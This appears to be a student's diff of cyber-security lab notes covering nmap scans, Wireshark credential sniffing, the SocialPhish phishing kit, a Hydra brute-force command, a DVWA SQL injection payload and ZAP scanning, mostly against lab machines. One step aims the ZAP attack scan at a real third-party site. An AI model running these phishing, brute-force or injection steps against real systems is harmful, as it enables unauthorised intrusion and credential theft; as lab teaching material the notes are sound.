@@ -1,0 +1,135 @@
+Cyber Security Practicals
+1. Active and Passive Reconnaissance
+Tool – OSINT
+Steps:
+- Go to OSINT
+- Open Domain -> WhoIS -> Open Site
+- Put URL of Website
+- Note Information such as registration data, IP address
+Fake and Original Website Checker
+Have I been Pawned Checker
+......................................................................
+2. Scan the Local Area
+Tool – Advanced IP Scanner
+Steps:
+- Open Advanced IP Scanner
+- Enter IP Range 192.168.20.0 – 254
+- Click Scan
+- Identify Active devices
+- Note IP, MAC & devices names
+........................................................................
+3. Scanning targeted computer for open ports, services, versions and OS
+Tool – NMAP
+Steps:
+Note: Make Firewall settings off -> Window defender firewall
+Metasploitable IP = inet address <IP>
+Nmap commands for targeted computers
+- nmap -sT <target_ip> – TCP Connect () scan -sT
+- nmap -sS <target_ip> – SYN Stealth Scan
+- nmap -sP <target_ip> – Ping Scan
+- nmap -sU <target_ip> – UDP Scan
+- nmap -sV <target_ip> – Version Detection
+- nmap -sO <target_ip> – OS finger Printing
+- nmap -sT -P 1-1000 <target_ip> – Checking 1000 TCP Ports
+- sudo nmap -sS -sV -p 1-1000 <target_ip>
+Practical:
+- Use VMWare
+- Open Kali Linux (Pw: Kali)
+- Open Metasploitabe (Pw: msfadmin)
+- In Msf -> ‘ifconfig’ -> Take IP
+- Run in Linux:
+- Ping <target_ip> - To check connection
+- nmap -sV <target_ip>
+- nmap -O / -sO <target_ip> - To Detect OS
+.........................................................................................
+4. Monitoring network Traffic, filtering HTTP traffic
+Tool – WireShark
+Steps:
+Open App WireShark
+- Select Ethernet -> Capture Button
+- Select TCP HTTP from Interface (Saved Icon)
+- Start Capturing
+In Browser Edge
+- Open Website http://testphp.vulnweb.com | altoro.mutual.com
+- Put Login (test – test)
+See packets in Wireshark
+- Filter http from input above
+- See Username + Password in Packets (POST Login Request)
+........................................................................
+5. Creating fake social media site phishing (Phishing attack)
+Tool – KALI + SocialPhish
+Steps:
+git clone https://github.com/pvanfas/socialphish.git
+After Installation in Linux Terminal:
+cd SocialPhish
+chmod +x socialphish.sh
+./socialphish.sh
+Forward Commands:
+- Choose Number to create that site
+- Give PORT No: (Ex: 8080)
+- Open Given Link in FireFox Browser
+- Put Credentials and Login
+- See Result Credentials in Terminal
+Result
+- [*] Credentials Found!
+- [*] Account: timhoward01@gmail.com
+- [*] Password: timhoward123
+- [*] Saved: sites/instagram/saved.usernames.txt
+  ...................................................
+6. Password Brute force attack / Dictionary Attack
+Tool – Kali and Metasploitable
+Steps:
+Open Linux and Metasploitable
+Get Msf IP using ifconfig
+In Linux – Hydra is already Installed
+- Create Passlist.txt file using:
+- // echo “pass1234 password MSF1234 msfadmin MSFADMIN” > passlist.txt
+- Create file using cat - cat > passlist.txt
+- Enter passwords – Ctrl + Z to save
+- To see passlist content – cat passlist.txt
+- Run command it check each password in list
+- hydra -l msfadmin -P passlist.txt (filename) 192.168.20.29 ftp
+  .............................................................................
+7. Checking Password Strength and Integrity
+Tool – Websites
+Steps:
+Go on Password Strenght Meter
+It will show How Strong is your password
+8. Key Logger Application
+Tool – Spyrix Tool
+Steps:
+Not Done Yet.
+..................................................................................
+9. SQL Injection Attack
+Tool – Kali and Metasploitable
+Steps:
+In Kali Linux – FireFox Browser Put Metasploitable IP Address
+- In Page Choose DVWA
+- Enter Username + Password [admin – password]
+- In DWVA Security, Set it to low
+- In SQL Injection, Give Prompt [1’or’1’=’1]
+- It will return the database of that app
+..................................................................................
+10. Scanning Vulnerabilities of Web Application and generating reports
+Tool – ZAP Tools
+Steps:
+Open ZAP Tool
+- Put URL of https://pff.com.pk/ (as attacking use enemy sites only)
+- Click Attack below Option
+- Let Process complete
+- From report tab -> Generate Report
+.................................................................
+11. Web Application and Penetration Testing
+Tool – Using Burp Suite Tool
+Steps: --
+12. DDOS Attack
+Tool – Using Hping from kali linux
+Steps: Slowloris
+13. Scanning System for Malware
+Tool – Inbuilt Windows Defender Antivirus
+14. Email, File, Website Verification
+Tool: Virus Total, MX Toolbox
+15. Internal and External Audit
+Tool: Execution of Basic Internal Security Audit
+16. Reporting Cyber Crime
+Step:
